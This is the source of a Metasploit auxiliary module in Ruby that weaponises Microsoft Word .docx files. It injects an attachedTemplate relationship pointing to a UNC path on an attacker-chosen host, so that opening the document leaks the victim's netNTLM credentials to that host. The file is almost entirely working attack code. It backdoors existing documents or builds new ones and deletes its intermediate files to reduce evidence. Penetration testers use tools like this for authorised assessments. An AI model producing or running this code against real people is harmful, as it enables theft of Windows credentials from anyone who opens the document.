##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'zip/zip'

class Metasploit3 < Msf::Auxiliary

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word UNC Path Injector',
			'Description'    => %q{
					This module modifies a .docx file that will, upon opening, submit all
					stored netNTLM credentials to a remote host. It can also create an empty docx file.
					If emailed the receiver needs to put the document in editing mode
					before the remote server will be contacted. Preview and read-only
					mode do not work. Verified to work with Microsoft Word 2003,
					2007 and 2010 as of Januari 2013 date by using auxiliary/server/capture/smb
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1 $',
			'References'     =>
			[
				[ 'URL', 'http://jedicorp.com/?p=534' ],
			],
			'Author'         =>
			[
				'SphaZ <cyberphaz[at]gmail.com>'
			]
		))

		register_options(
			[
				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to','']),
				OptString.new('SRCFILE', [false, '.docx file to backdoor. If left empty, creates an emtpy document', '']),
				OptString.new('SKLFILENAME', [false,'Document output filename', 'stealnetNTLM.docx']),
				OptPath.new('SKLOUTPUTPATH', [false, 'The location where the backdoored empty .docx file will be written','./']),
				OptString.new('SKLDOCAUTHOR',[false,'Document author for skeleton document', 'SphaZ']),
			], self.class)
	end


	#here we create an empty .docx file with the UNC path. Only done when SRCFILE is empty
	def makeNewFile
		metadataFileData = ""
		metadataFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
		metadataFileData << " xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" "
		metadataFileData << "xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" "
		metadataFileData << "xmlns:dcmitype=\"http://purl.org/dc/dcmitype/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		metadataFileData << "<dc:creator>#{datastore['SKLDOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['SKLDOCAUTHOR']}"
		metadataFileData << "</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\"dcterms:W3CDTF\">"
		metadataFileData << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
		metadataFileData << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"

		#Lets get the local filepath to figure out where we need to write the metadata file
		metadataFileName = File.dirname(self.file_path)+'/sourcedoc/docProps/core.xml'
		begin
			if File.exists?(metadataFileName)
				vprint_status("Deleting metadatafile")
				File.delete(metadataFileName)
			end
			fd = File.open( metadataFileName, 'wb+' )
			fd.puts(metadataFileData)
			fd.close
		rescue
			print_error("Cant write to #{metadataFileName} make sure module and data are intact")
			return nil
		end

		#now lets write the _rels file that contains the UNC path
		refdataFileName = File.dirname(self.file_path) + '/sourcedoc/word/_rels/settings.xml.rels'
		begin
			fd = File.open( refdataFileName, 'wb+' )
			fd.puts(@relsFileData)
			fd.close
		rescue
			print_error("Cant write to #{refdataFileName} make sure module and data are intact.")
			return nil
		end

		#and finally, lets creat the .docx file
		inputPath = File.dirname(self.file_path) + '/sourcedoc/'
		inputPath.sub!(%r[/S],'')

		archive = File.join(datastore['SKLOUTPUTPATH'], datastore['SKLFILENAME'])
		#if file exists, lets not overwrite
		if File.exists?(archive)
			print_error("Output file #{archive} already exists! Set a different name for SKLOUTPUTPATH and/or SKLFILENAME.")
			return nil
		end

		if zipDocx(inputPath, archive, false).nil?
			return nil
		end

		begin
			#delete the created xml files, the less evidence of parameters used the better
			File.delete(File.dirname(self.file_path)+'/sourcedoc/docProps/core.xml')
			File.delete(File.dirname(self.file_path) + '/sourcedoc/word/_rels/settings.xml.rels')
		rescue
			print_error("Error deleting local core and settings documents. Generating new file worked though")
		end
		return 0
	end


	#this bit checks the settings.xml and looks for the relations file entry we need for our evil masterplan.
	#and then inserts the UNC path into the _rels file.
	def manipulateFile
		ref = "<w:attachedTemplate r:id=\"rId1\"/>"

		if File.exists?(datastore['SRCFILE'])
			if File.stat(datastore['SRCFILE']).readable? and File.stat(datastore['SRCFILE']).writable?
				vprint_status("We can read and write the file, this is probably a good thing :P")
			else
				print_error("Not enough rights to modify the file. Aborting.")
				return nil
			end

			fileContent = getFileFromDocx("word/settings.xml")
			if fileContent.nil?
				return nil
			end

			if not fileContent.index("w:attachedTemplate r:id=\"rId1\"").nil?
				vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
				#and we put just our rels file into the docx
				if unzipDocx.nil?
					return nil
				end
				if updateDocxFile("word/_rels/settings.xml.rels", @relsFileData).nil?
					return nil
				end
				#ok we got through this, lets zip the file, overwriting the original in this case
				begin
					File.delete(datastore['SRCFILE'])
					if zipDocx(@tmpDir, datastore['SRCFILE'],true).nil?
						return nil
					end
				rescue
					print_error("Can't modify the original document :(")
					return nil
				end
			else
				#now insert the reference to the file that will enable our malicious entry
				insertOne = fileContent.index("<w:defaultTabStop")

				if insertOne.nil?
					insertTwo = fileContent.index("<w:hyphenationZone") # 2nd choice
					if not insertTwo.nil?
						vprint_status("HypenationZone found, we use this for insertion.")
						fileContent.insert(insertTwo, ref )
						end
				else
					vprint_status("DefaultTabStop found, we use this for insertion.")
					fileContent.insert(insertOne, ref )
					end

				if insertOne.nil? && insertTwo.nil?
					vprint_error("Cannot find insert point for reference into settings.xml")
					return nil
				end

				if unzipDocx.nil?
					return nil
				end
				#update the settings files
				if updateDocxFile("word/settings.xml",fileContent).nil?
					print_error("Error inserting data into word/settings.xml")
					return nil
				end
				if updateDocxFile("word/_rels/settings.xml.rels", @relsFileData).nil?
					print_error("Eror inserting data into word/_rels/settings.xml.rels")
					return nil
				end
				#ok we got through this, lets zip the file, overwriting the original in this case
				begin
					File.delete(datastore['SRCFILE'])
					if zipDocx(@tmpDir, datastore['SRCFILE'],true).nil?
						return nil
					end
				rescue
					print_error("Can't modify the original document :(")
					return nil
				end

			end
		else
			print_error("File #{datastore['SRCFILE']} does not exist. Aborting.")
			return nil
		end

		return 0
	end

	#read a file from .docx into a string
	def getFileFromDocx(fileString)
		begin
			Zip::ZipFile.open(datastore['SRCFILE']) do |fileZip|
				fileZip.each do |f|
					next unless f.to_s == fileString
					return f.get_input_stream.read
				end
			end
			fileZip.close
			print_error("Cant find #{fileString} inside the .docx")
			return nil
		rescue
			print_error("Unknown error reading docx file.")
			fileZip.close
			return nil
		end
		fileZip.close
	end

	def zipDocx(inputPath, archive, delsource)
		begin
			#add the prepared files to the zip file
			Zip::ZipFile.open(archive, 'wb') do |fileZip|
				Dir["#{inputPath}/**/**"].reject{|f|f==archive}.each do |file|
					fileZip.add(file.sub(inputPath+'/',''), file)
				end
				relsFile = inputPath + '/_rels/.rels'
				fileZip.add(relsFile.sub(inputPath+'/',''), relsFile)
			end
		rescue
			print_error("Error zipping file..")
			begin
				FileUtils.rm_rf(inputPath)
			rescue
				print_error("Cant even clean up my own mess, I give up")
				return nil
			end
			return nil
		end
		#do we delete the source?
		if delsource
			begin
				FileUtils.rm_rf(inputPath)
			rescue
				print_error("Cant even clean up my own mess, I give up")
			end
		end
		return 0
	end

	def unzipDocx
		begin
			vprint_status("tmpdir: #{@tmpDir}")
			if not File.directory?(@tmpDir)
				vprint_status("Damn rubyzip cant be relied upon, so we do it the hard way. Extracting #{datastore['SRCFILE']}")
				Zip::ZipFile.open(datastore['SRCFILE'])  do |fileZip|
					fileZip.each do |entry|
						if not entry.nil?
							vprint_status("extracting entry: #{entry.name}")
						end
						fpath = File.join(@tmpDir, entry.name)
						FileUtils.mkdir_p(File.dirname(fpath))
						fileZip.extract(entry, fpath)
					end
				end
			end
		rescue
			print_error("There was an error unzipping")
			return nil
		end
		return 0
	end

	#used for updating the files inside the docx from a string
	def updateDocxFile(fileString, content)
		begin
			#ok so now we unpacked the docx file, lets start to update the file we need to do
			#does the file already exist?
			archive = File.join(@tmpDir, fileString)
			vprint_status("We need to look for: #{archive}")
			if File.exists?(archive)
				vprint_status("Deleting original file #{archive}")
				File.delete(archive)
			end
			#now lets put OUR file there
			File.open(archive, 'wb+') { |f| f.write(content) }
		rescue Exception => ex
			print_error("Well, extracting and manipulating the file went wrong :(")
			return nil
		end
		return 0
	end

	def run
		#we need this in in bot makeNewFile and manipulateFile
		@relsFileData = ""
		@relsFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
		@relsFileData << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
		@relsFileData << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/".chomp
		@relsFileData << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
		#where do we unpack our file?
		@tmpDir = "#{Dir.tmpdir}/#{Time.now.to_i}#{rand(1000)}/"

		if "#{datastore['SRCFILE']}" == ""
			#make an empty file
			print_status("Creating empty document")
			if not makeNewFile.nil?
				print_good("Success! Document #{datastore['SKLFILENAME']} created in #{datastore['SKLOUTPUTPATH']}")
			end
		else
			#extract the word/settings.xml and edit in the reference we need
			print_status("Injecting UNC path into existing document.")
			if not manipulateFile.nil?
				print_good("Success! Document #{datastore['SRCFILE']} now references to #{datastore['LHOST']}")
			else
				print_error("Something went wrong!")
			end
		end
	end
end
